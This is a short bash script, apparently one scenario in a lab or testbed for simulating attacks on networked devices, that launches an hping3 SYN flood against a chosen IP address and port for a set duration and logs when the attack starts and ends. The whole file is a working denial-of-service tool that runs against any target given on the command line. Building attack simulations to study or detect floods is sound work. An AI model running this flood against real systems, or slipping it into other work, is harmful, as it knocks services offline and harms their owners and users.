#!/bin/bash
# Scenario 3: DDoS / DoS — SYN flood against a target device/hub.
# Usage: ./ddos_flood.sh <target_ip> <target_port> <duration_sec>
set -e
TARGET_IP="${1:?target_ip required}"
TARGET_PORT="${2:?target_port required}"
DURATION="${3:-30}"

python3 -c "from logger import log_event; log_event('ddos', 'attack_start', target='$TARGET_IP:$TARGET_PORT')"

timeout "$DURATION" hping3 -S --flood -p "$TARGET_PORT" "$TARGET_IP" || true

python3 -c "from logger import log_event; log_event('ddos', 'attack_end')"
